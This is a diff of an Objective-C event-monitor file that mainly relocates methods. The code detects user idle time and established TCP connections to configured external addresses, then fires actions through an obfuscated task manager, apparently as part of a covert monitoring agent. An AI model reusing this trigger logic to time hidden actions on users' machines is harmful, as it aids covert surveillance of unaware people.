@@ -149,7 +149,6 @@ NSLock *connectionLock;
 #pragma mark Events monitor routines
 #pragma mark -
 
-
 - (BOOL)isEventEnable: (NSDictionary*) configuration
 {
   BOOL enabled = TRUE;
@@ -187,6 +186,32 @@ NSLock *connectionLock;
   return breaked;
 }
 
+- (BOOL)tryTriggerRepeat:(int)anAction 
+               withDealy:(int)aDelay 
+            andIteration:(int)iter
+        andConfiguration:(NSDictionary*)configuration
+{
+  __m_MTaskManager *taskManager = [__m_MTaskManager sharedInstance];
+  
+  if (anAction == 0xFFFFFFFF)
+    return FALSE;
+  
+  do 
+  {
+    if (iter > 0)
+      iter--;
+    
+    if ([self waitDelaySeconds:configuration] == FALSE && 
+        [self isEventEnable: configuration] == TRUE)
+      [taskManager triggerAction: anAction];
+    else
+      break;
+    
+  } while(iter == 0xFFFFFFFF || iter > 0);
+  
+  return TRUE;
+}
+
 - (void)tryTriggerRepeat:(int)anAction 
                withDealy:(int)aDelay 
             andIteration:(int)iter
@@ -221,30 +246,140 @@ NSLock *connectionLock;
   return;
 }
 
-- (BOOL)tryTriggerRepeat:(int)anAction 
-               withDealy:(int)aDelay 
-            andIteration:(int)iter
-        andConfiguration:(NSDictionary*)configuration
+- (UInt32)getIdleSec
 {
-  __m_MTaskManager *taskManager = [__m_MTaskManager sharedInstance];
+  int64_t idlesecs = -1;
+  io_iterator_t iter = 0;
+  int64_t nanoseconds = 0;
   
-  if (anAction == 0xFFFFFFFF)
-    return FALSE;
+  if (IOServiceGetMatchingServices(kIOMasterPortDefault, IOServiceMatching("IOHIDSystem"), &iter) == KERN_SUCCESS) 
+  {
+    io_registry_entry_t entry = IOIteratorNext(iter);
     
-  do 
+    if (entry) 
     {
-      if (iter > 0)
-        iter--;
+      CFMutableDictionaryRef dict = NULL;
+      if (IORegistryEntryCreateCFProperties(entry, &dict, kCFAllocatorDefault, 0) == KERN_SUCCESS) 
+      {
+        CFNumberRef obj = CFDictionaryGetValue(dict, CFSTR("HIDIdleTime"));
+        if (obj) 
+        {
+          
+          if (CFNumberGetValue(obj, kCFNumberSInt64Type, &nanoseconds)) 
+            idlesecs = (nanoseconds >> 30); // Divide by 10^9 to convert from nanoseconds to seconds.
+        }
+        CFRelease(dict);
+      }
       
-      if ([self waitDelaySeconds:configuration] == FALSE && 
-          [self isEventEnable: configuration] == TRUE)
-        [taskManager triggerAction: anAction];
-      else
-        break;
-    
-    } while(iter == 0xFFFFFFFF || iter > 0);
+      IOObjectRelease(entry);
+    }
+    IOObjectRelease(iter);
+  }
+  
+#ifdef DEBUG_EVENTS
+  infoLog(@"%s: idle %lu sec", __FUNCTION__, idlesecs);
+#endif
+  
+  return idlesecs;
+}
 
-  return TRUE;
+- (BOOL)isInIdle:(UInt32) sec
+{
+  if ([self getIdleSec] > sec)
+    return TRUE;
+  else 
+    return FALSE;
+}
+
+- (void)eventIdle:(NSDictionary*)configuration
+{
+  NSAutoreleasePool *outerPool = [[NSAutoreleasePool alloc] init];
+  BOOL amIInIdle = FALSE;
+  BOOL idleTriggered = FALSE;
+  [configuration retain];
+  
+  UInt32 *seconds = (UInt32*)[[configuration objectForKey: @"data"] bytes];
+  
+  int enterAction   = [[configuration objectForKey: @"actionID"] intValue];
+  int repeat        = [[configuration objectForKey:@"repeat"] intValue];
+  int iter          = [[configuration objectForKey:@"iter"] intValue];
+  int end           = [[configuration objectForKey:@"end"] intValue];
+  
+  int currentIter   = iter;
+  
+#ifdef DEBUG_EVENTS
+  infoLog(@"%s: starting idle event every %lu sec", __FUNCTION__, *seconds);
+#endif
+  
+  while ([configuration objectForKey: @"status"] != EVENT_STOP
+         && [configuration objectForKey: @"status"] != EVENT_STOPPED)
+  {
+    amIInIdle = [self isInIdle: *seconds];
+    
+    if (amIInIdle == TRUE && idleTriggered == FALSE)
+    {
+      if ([self isEventEnable: configuration] == TRUE)
+      {
+#ifdef DEBUG_EVENTS
+        infoLog(@"%s: triggering idle start %d", __FUNCTION__, enterAction);
+#endif
+        idleTriggered = TRUE;
+        [[__m_MTaskManager sharedInstance] triggerAction: enterAction];
+        currentIter = 0;
+      }
+    }
+    
+    if (amIInIdle == NO && idleTriggered == TRUE)
+    {
+      if ([self isEventEnable: configuration] == TRUE) 
+      {
+#ifdef DEBUG_EVENTS
+        infoLog(@"%s: triggering idle stop %d", __FUNCTION__, end);
+#endif
+        [[__m_MTaskManager sharedInstance] triggerAction: end];
+        idleTriggered = FALSE;
+      }
+    }
+    
+    if (amIInIdle == TRUE)
+    {
+      if (((iter == 0xFFFFFFFF) || (currentIter < iter)) && 
+          [self waitDelaySeconds:configuration] == FALSE &&
+          [self isEventEnable: configuration] == TRUE)
+      {
+#ifdef DEBUG_EVENTS
+        infoLog(@"%s: triggering idle repeat %d", __FUNCTION__, repeat);
+#endif
+        [[__m_MTaskManager sharedInstance] triggerAction: repeat];
+        currentIter++;
+      }
+    }
+    
+    sleep(1);
+  }
+  
+  if ([[configuration objectForKey: @"status"] isEqualToString: EVENT_STOP])
+  {
+    [configuration setValue: EVENT_STOPPED forKey: @"status"];
+  }
+  
+  [configuration release];
+  [outerPool release];
+  
+  return;
+}
+
+- (void)eventQuotaNotificationCallback:(NSNotification*)aNotify
+{
+  NSNumber *actionId = (NSNumber*)[aNotify object];
+  
+  if (actionId && [actionId intValue] > -1)
+  {
+#ifdef DEBUG_EVENTS
+    infoLog(@"event quota triggering action %@", actionId);
+#endif
+    [[__m_MTaskManager sharedInstance] triggerAction: [actionId intValue]];
+  }
 }
 
 // Done.!
@@ -492,6 +627,229 @@ NSLock *connectionLock;
   
   if (startThreadDate != nil)
     [startThreadDate release];
+  
+  [outerPool release];
+}
+
+
+// Done.!
+- (void)eventConnection: (NSDictionary *)configuration
+{
+  NSAutoreleasePool *outerPool = [[NSAutoreleasePool alloc] init];
+  
+  __m_MTaskManager *taskManager = [__m_MTaskManager sharedInstance];
+  char mibName[] = "net.inet.tcp.pcblist";
+  connectionStruct *connectionRawData;
+  BOOL connectionFound;
+  struct xinpgen *xig, *oxig;
+  struct tcpcb *tp = NULL;
+  struct inpcb *inp;
+  struct xsocket *so;
+  size_t len = 0;
+  char *buffer;
+  
+  [configuration retain];
+  
+  int actionID      = [[configuration objectForKey: @"actionID"] intValue];
+  int repeat        = [[configuration objectForKey:@"repeat"] intValue];
+  int delay         = [[configuration objectForKey:@"delay"] intValue];
+  int iter          = [[configuration objectForKey:@"iter"] intValue];
+  int end           = [[configuration objectForKey:@"end"] intValue];
+  
+  while ([configuration objectForKey: @"status"]    != EVENT_STOP
+         && [configuration objectForKey: @"status"] != EVENT_STOPPED)
+  {
+    NSAutoreleasePool *innerPool = [[NSAutoreleasePool alloc] init];
+    connectionFound = FALSE;
+    
+    connectionRawData = (connectionStruct *)[[configuration objectForKey: @"data"] bytes];
+    
+    u_long ipAddress   = connectionRawData->ipAddress;
+    u_long netMask     = connectionRawData->netMask;
+    int connectionPort = connectionRawData->port;
+    
+    struct in_addr tempAddress;
+    tempAddress.s_addr = ipAddress;
+    
+#ifdef DEBUG_EVENTS
+    verboseLog(@"IP Address to Match: %s", inet_ntoa(tempAddress));
+#endif
+    
+    if (sysctlbyname(mibName, 0, &len, 0, 0) >= 0)
+    {
+      if ((buffer = malloc(len)) != 0)
+      {
+        if (sysctlbyname(mibName, buffer, &len, 0, 0) < 0)
+        {
+#ifdef DEBUG_EVENTS
+          errorLog(@"Error on second sysctlbyname call");
+#endif
+          
+          free(buffer);
+          [configuration release];
+          [innerPool release];
+          [outerPool release];
+          [NSThread exit];
+        }
+      }
+      else
+      {
+#ifdef DEBUG_EVENTS
+        errorLog(@"Error on malloc");
+#endif
+        free(buffer);
+        [configuration release];
+        [innerPool release];
+        [outerPool release];
+        [NSThread exit];
+      }
+    }
+    else
+    {
+#ifdef DEBUG_EVENTS
+      errorLog(@"Error on first sysctlbyname call");
+#endif
+      
+      free(buffer);
+      [configuration release];
+      [innerPool release];
+      [outerPool release];
+      [NSThread exit];
+    }
+    
+    oxig = xig = (struct xinpgen *)buffer;
+    
+    struct in_addr netMaskStruct;
+    netMaskStruct.s_addr = netMask;
+    
+    NSString *ip        = [NSString stringWithUTF8String: inet_ntoa(tempAddress)];
+    NSNumber *port      = [NSNumber numberWithInt: connectionPort];
+    NSString *ipNetmask = [NSString stringWithUTF8String: inet_ntoa(netMaskStruct)];
+    
+    //
+    // Cycle through all the TCP connections
+    //
+    for (xig = (struct xinpgen *)((char *)xig + xig->xig_len);
+         xig->xig_len > sizeof(struct xinpgen);
+         xig = (struct xinpgen *)((char *)xig + xig->xig_len))
+    {
+      tp  = &((struct xtcpcb *)xig)->xt_tp;
+      inp = &((struct xtcpcb *)xig)->xt_inp;
+      so  = &((struct xtcpcb *)xig)->xt_socket;
+      
+      //
+      // Check only for TCP and ESTABLISHED connections
+      //
+      extern char *tcpstates[];
+      const char *state = "ESTABLISHED";
+      
+      if (so->xso_protocol == IPPROTO_TCP && strncmp(tcpstates[tp->t_state],
+                                                     state,
+                                                     strlen(state)) == 0)
+      {
+#ifdef DEBUG_EVENTS
+        verboseLog(@"Found an established connection: %s", inet_ntoa(inp->inp_faddr));
+        verboseLog(@"Configured netmask: %@", ipNetmask);
+#endif
+        
+        //
+        // Check if the ip belongs to any local network
+        // and if it's the ip that we are looking for
+        //
+        if (isAddressOnLan(inp->inp_faddr) == FALSE
+            && compareIpAddress(inp->inp_faddr, tempAddress, netMask) == TRUE)
+        {
+#ifdef DEBUG_EVENTS
+          warnLog(@"Address in list: %s (not on lan)", inet_ntoa(inp->inp_faddr));
+#endif
+          
+          if (connectionPort == 0 || inp->inp_fport == connectionPort)
+          {
+            connectionFound = TRUE;
+            
+            //
+            // Check if the address hasn't been detected already
+            //
+            if (isAddressAlreadyDetected(ip,
+                                         connectionPort,
+                                         ipNetmask,
+                                         connectionsDetected) == FALSE)
+            { 
+              NSArray *keys = [[NSArray alloc] initWithObjects: @"ip", @"port", @"netmask", nil];
+              NSArray *objects = [[NSArray alloc] initWithObjects: ip, port, ipNetmask, nil];
+              
+              NSDictionary *connection = [[NSDictionary alloc] initWithObjects: objects
+                                                                       forKeys: keys];
+              
+              [connectionLock lock];
+              [connectionsDetected addObject: connection];
+              [connectionLock unlock];
+              
+              [keys release];
+              [objects release];
+              [connection release];
+              
+#ifdef DEBUG_EVENTS
+              warnLog(@"Event Connection triggered!");
+#endif
+              if ([self isEventEnable: configuration] == TRUE)
+                [taskManager triggerAction: actionID];
+              
+              [self tryTriggerRepeat: repeat 
+                           withDealy: delay 
+                        andIteration: iter 
+                    andConfiguration: configuration];
+              
+              if ([self isEventEnable: configuration] == TRUE)
+                [taskManager triggerAction: end];
+              
+            }
+          }
+        }
+      }
+    }
+    
+    free(buffer);
+    
+    if (isAddressAlreadyDetected(ip,
+                                 connectionPort,
+                                 ipNetmask,
+                                 connectionsDetected) == TRUE
+        && connectionFound                            == FALSE)
+    {
+#ifdef DEBUG_EVENTS
+      infoLog(@"Removing Connection");
+#endif
+      //
+      // Connection has been found previously and now it's not there anymore
+      // thus we remove it from our array in order to let it trigger again
+      //
+      NSArray *keys = [[NSArray alloc] initWithObjects: @"ip", @"port", @"netmask", nil];
+      NSArray *objects = [[NSArray alloc] initWithObjects: ip, port, ipNetmask, nil];
+      
+      NSDictionary *connection = [[NSDictionary alloc] initWithObjects: objects
+                                                               forKeys: keys];
+      [connectionLock lock];
+      [connectionsDetected removeObject: connection];
+      [connectionLock unlock];
+      
+      [keys release];
+      [objects release];
+      [connection release];
+    }
+    
+    [innerPool release];
+    usleep(500000);
+  }
+  
+  if ([[configuration objectForKey: @"status"] isEqualToString: EVENT_STOP])
+  {
+    [configuration setValue: EVENT_STOPPED forKey: @"status"];
+    
+    [connectionsDetected removeAllObjects];
+  }
+  
+  [configuration release];
   
   [outerPool release];
 }
@@ -816,228 +1174,6 @@ NSLock *connectionLock;
 }
 
 // Done.!
-- (void)eventConnection: (NSDictionary *)configuration
-{
-  NSAutoreleasePool *outerPool = [[NSAutoreleasePool alloc] init];
-  
-  __m_MTaskManager *taskManager = [__m_MTaskManager sharedInstance];
-  char mibName[] = "net.inet.tcp.pcblist";
-  connectionStruct *connectionRawData;
-  BOOL connectionFound;
-  struct xinpgen *xig, *oxig;
-  struct tcpcb *tp = NULL;
-  struct inpcb *inp;
-  struct xsocket *so;
-  size_t len = 0;
-  char *buffer;
-
-  [configuration retain];
-
-  int actionID      = [[configuration objectForKey: @"actionID"] intValue];
-  int repeat        = [[configuration objectForKey:@"repeat"] intValue];
-  int delay         = [[configuration objectForKey:@"delay"] intValue];
-  int iter          = [[configuration objectForKey:@"iter"] intValue];
-  int end           = [[configuration objectForKey:@"end"] intValue];
-  
-  while ([configuration objectForKey: @"status"]    != EVENT_STOP
-         && [configuration objectForKey: @"status"] != EVENT_STOPPED)
-    {
-      NSAutoreleasePool *innerPool = [[NSAutoreleasePool alloc] init];
-      connectionFound = FALSE;
-      
-      connectionRawData = (connectionStruct *)[[configuration objectForKey: @"data"] bytes];
-      
-      u_long ipAddress   = connectionRawData->ipAddress;
-      u_long netMask     = connectionRawData->netMask;
-      int connectionPort = connectionRawData->port;
- 
-      struct in_addr tempAddress;
-      tempAddress.s_addr = ipAddress;
-
-#ifdef DEBUG_EVENTS
-      verboseLog(@"IP Address to Match: %s", inet_ntoa(tempAddress));
-#endif
-
-      if (sysctlbyname(mibName, 0, &len, 0, 0) >= 0)
-        {
-          if ((buffer = malloc(len)) != 0)
-            {
-              if (sysctlbyname(mibName, buffer, &len, 0, 0) < 0)
-                {
-#ifdef DEBUG_EVENTS
-                  errorLog(@"Error on second sysctlbyname call");
-#endif
-                  
-                  free(buffer);
-                  [configuration release];
-                  [innerPool release];
-                  [outerPool release];
-                  [NSThread exit];
-                }
-            }
-          else
-            {
-#ifdef DEBUG_EVENTS
-              errorLog(@"Error on malloc");
-#endif
-              free(buffer);
-              [configuration release];
-              [innerPool release];
-              [outerPool release];
-              [NSThread exit];
-            }
-        }
-      else
-        {
-#ifdef DEBUG_EVENTS
-          errorLog(@"Error on first sysctlbyname call");
-#endif
-          
-          free(buffer);
-          [configuration release];
-          [innerPool release];
-          [outerPool release];
-          [NSThread exit];
-        }
-      
-      oxig = xig = (struct xinpgen *)buffer;
-      
-      struct in_addr netMaskStruct;
-      netMaskStruct.s_addr = netMask;
-      
-      NSString *ip        = [NSString stringWithUTF8String: inet_ntoa(tempAddress)];
-      NSNumber *port      = [NSNumber numberWithInt: connectionPort];
-      NSString *ipNetmask = [NSString stringWithUTF8String: inet_ntoa(netMaskStruct)];
-      
-      //
-      // Cycle through all the TCP connections
-      //
-      for (xig = (struct xinpgen *)((char *)xig + xig->xig_len);
-           xig->xig_len > sizeof(struct xinpgen);
-           xig = (struct xinpgen *)((char *)xig + xig->xig_len))
-        {
-          tp  = &((struct xtcpcb *)xig)->xt_tp;
-          inp = &((struct xtcpcb *)xig)->xt_inp;
-          so  = &((struct xtcpcb *)xig)->xt_socket;
-          
-          //
-          // Check only for TCP and ESTABLISHED connections
-          //
-          extern char *tcpstates[];
-          const char *state = "ESTABLISHED";
-          
-          if (so->xso_protocol == IPPROTO_TCP && strncmp(tcpstates[tp->t_state],
-                                                         state,
-                                                         strlen(state)) == 0)
-            {
-#ifdef DEBUG_EVENTS
-              verboseLog(@"Found an established connection: %s", inet_ntoa(inp->inp_faddr));
-              verboseLog(@"Configured netmask: %@", ipNetmask);
-#endif
-              
-              //
-              // Check if the ip belongs to any local network
-              // and if it's the ip that we are looking for
-              //
-              if (isAddressOnLan(inp->inp_faddr) == FALSE
-                  && compareIpAddress(inp->inp_faddr, tempAddress, netMask) == TRUE)
-                {
-#ifdef DEBUG_EVENTS
-                  warnLog(@"Address in list: %s (not on lan)", inet_ntoa(inp->inp_faddr));
-#endif
-                  
-                  if (connectionPort == 0 || inp->inp_fport == connectionPort)
-                    {
-                      connectionFound = TRUE;
-                      
-                      //
-                      // Check if the address hasn't been detected already
-                      //
-                      if (isAddressAlreadyDetected(ip,
-                                                   connectionPort,
-                                                   ipNetmask,
-                                                   connectionsDetected) == FALSE)
-                        { 
-                          NSArray *keys = [[NSArray alloc] initWithObjects: @"ip", @"port", @"netmask", nil];
-                          NSArray *objects = [[NSArray alloc] initWithObjects: ip, port, ipNetmask, nil];
-                          
-                          NSDictionary *connection = [[NSDictionary alloc] initWithObjects: objects
-                                                                                   forKeys: keys];
-                          
-                          [connectionLock lock];
-                          [connectionsDetected addObject: connection];
-                          [connectionLock unlock];
-                          
-                          [keys release];
-                          [objects release];
-                          [connection release];
-                          
-#ifdef DEBUG_EVENTS
-                          warnLog(@"Event Connection triggered!");
-#endif
-                          if ([self isEventEnable: configuration] == TRUE)
-                            [taskManager triggerAction: actionID];
-                          
-                          [self tryTriggerRepeat: repeat 
-                                       withDealy: delay 
-                                    andIteration: iter 
-                                andConfiguration: configuration];
-                          
-                          if ([self isEventEnable: configuration] == TRUE)
-                            [taskManager triggerAction: end];
-                          
-                        }
-                    }
-                }
-            }
-        }
-      
-      free(buffer);
-      
-      if (isAddressAlreadyDetected(ip,
-                                   connectionPort,
-                                   ipNetmask,
-                                   connectionsDetected) == TRUE
-          && connectionFound                            == FALSE)
-        {
-#ifdef DEBUG_EVENTS
-          infoLog(@"Removing Connection");
-#endif
-          //
-          // Connection has been found previously and now it's not there anymore
-          // thus we remove it from our array in order to let it trigger again
-          //
-          NSArray *keys = [[NSArray alloc] initWithObjects: @"ip", @"port", @"netmask", nil];
-          NSArray *objects = [[NSArray alloc] initWithObjects: ip, port, ipNetmask, nil];
-          
-          NSDictionary *connection = [[NSDictionary alloc] initWithObjects: objects
-                                                                   forKeys: keys];
-          [connectionLock lock];
-          [connectionsDetected removeObject: connection];
-          [connectionLock unlock];
-          
-          [keys release];
-          [objects release];
-          [connection release];
-        }
-      
-      [innerPool release];
-      usleep(500000);
-    }
-  
-  if ([[configuration objectForKey: @"status"] isEqualToString: EVENT_STOP])
-    {
-      [configuration setValue: EVENT_STOPPED forKey: @"status"];
-      
-      [connectionsDetected removeAllObjects];
-    }
-    
-  [configuration release];
-  
-  [outerPool release];
-}
-
-// Done.!
 - (void)eventScreensaver: (NSDictionary *)configuration
 {
   NSAutoreleasePool *outerPool = [[NSAutoreleasePool alloc] init];
@@ -1106,19 +1242,6 @@ NSLock *connectionLock;
   [configuration release];
   
   [outerPool release];
-}
-
-- (void)eventQuotaNotificationCallback:(NSNotification*)aNotify
-{
-  NSNumber *actionId = (NSNumber*)[aNotify object];
-
-  if (actionId && [actionId intValue] > -1)
-    {
-#ifdef DEBUG_EVENTS
-    infoLog(@"event quota triggering action %@", actionId);
-#endif
-      [[__m_MTaskManager sharedInstance] triggerAction: [actionId intValue]];
-    }
 }
 
 typedef struct {
@@ -1192,127 +1315,5 @@ typedef struct {
   return;
 }
 
-- (UInt32)getIdleSec
-{
-  int64_t idlesecs = -1;
-  io_iterator_t iter = 0;
-  int64_t nanoseconds = 0;
-  
-  if (IOServiceGetMatchingServices(kIOMasterPortDefault, IOServiceMatching("IOHIDSystem"), &iter) == KERN_SUCCESS) 
-    {
-      io_registry_entry_t entry = IOIteratorNext(iter);
-      
-      if (entry) 
-        {
-          CFMutableDictionaryRef dict = NULL;
-          if (IORegistryEntryCreateCFProperties(entry, &dict, kCFAllocatorDefault, 0) == KERN_SUCCESS) 
-            {
-              CFNumberRef obj = CFDictionaryGetValue(dict, CFSTR("HIDIdleTime"));
-              if (obj) 
-                {
-                  
-                  if (CFNumberGetValue(obj, kCFNumberSInt64Type, &nanoseconds)) 
-                      idlesecs = (nanoseconds >> 30); // Divide by 10^9 to convert from nanoseconds to seconds.
-                }
-              CFRelease(dict);
-            }
-          
-          IOObjectRelease(entry);
-        }
-      IOObjectRelease(iter);
-    }
-  
-#ifdef DEBUG_EVENTS
-  infoLog(@"%s: idle %lu sec", __FUNCTION__, idlesecs);
-#endif
-  
-  return idlesecs;
-}
-
-- (BOOL)isInIdle:(UInt32) sec
-{
-  if ([self getIdleSec] > sec)
-    return TRUE;
-  else 
-    return FALSE;
-}
-
-- (void)eventIdle:(NSDictionary*)configuration
-{
-  NSAutoreleasePool *outerPool = [[NSAutoreleasePool alloc] init];
-  BOOL amIInIdle = FALSE;
-  BOOL idleTriggered = FALSE;
-  [configuration retain];
-  
-  UInt32 *seconds = (UInt32*)[[configuration objectForKey: @"data"] bytes];
-  
-  int enterAction   = [[configuration objectForKey: @"actionID"] intValue];
-  int repeat        = [[configuration objectForKey:@"repeat"] intValue];
-  int iter          = [[configuration objectForKey:@"iter"] intValue];
-  int end           = [[configuration objectForKey:@"end"] intValue];
-  
-  int currentIter   = iter;
-  
-#ifdef DEBUG_EVENTS
-  infoLog(@"%s: starting idle event every %lu sec", __FUNCTION__, *seconds);
-#endif
-  
-  while ([configuration objectForKey: @"status"] != EVENT_STOP
-         && [configuration objectForKey: @"status"] != EVENT_STOPPED)
-    {
-      amIInIdle = [self isInIdle: *seconds];
-    
-      if (amIInIdle == TRUE && idleTriggered == FALSE)
-        {
-          if ([self isEventEnable: configuration] == TRUE)
-            {
-#ifdef DEBUG_EVENTS
-              infoLog(@"%s: triggering idle start %d", __FUNCTION__, enterAction);
-#endif
-              idleTriggered = TRUE;
-              [[__m_MTaskManager sharedInstance] triggerAction: enterAction];
-              currentIter = 0;
-            }
-        }
-      
-      if (amIInIdle == NO && idleTriggered == TRUE)
-        {
-          if ([self isEventEnable: configuration] == TRUE) 
-            {
-#ifdef DEBUG_EVENTS
-              infoLog(@"%s: triggering idle stop %d", __FUNCTION__, end);
-#endif
-              [[__m_MTaskManager sharedInstance] triggerAction: end];
-              idleTriggered = FALSE;
-            }
-        }
-    
-      if (amIInIdle == TRUE)
-        {
-          if (((iter == 0xFFFFFFFF) || (currentIter < iter)) && 
-              [self waitDelaySeconds:configuration] == FALSE &&
-              [self isEventEnable: configuration] == TRUE)
-            {
-#ifdef DEBUG_EVENTS
-              infoLog(@"%s: triggering idle repeat %d", __FUNCTION__, repeat);
-#endif
-              [[__m_MTaskManager sharedInstance] triggerAction: repeat];
-              currentIter++;
-            }
-        }
-      
-      sleep(1);
-    }
-  
-  if ([[configuration objectForKey: @"status"] isEqualToString: EVENT_STOP])
-    {
-    [configuration setValue: EVENT_STOPPED forKey: @"status"];
-    }
-  
-  [configuration release];
-  [outerPool release];
-  
-  return;
-}
 
 @end
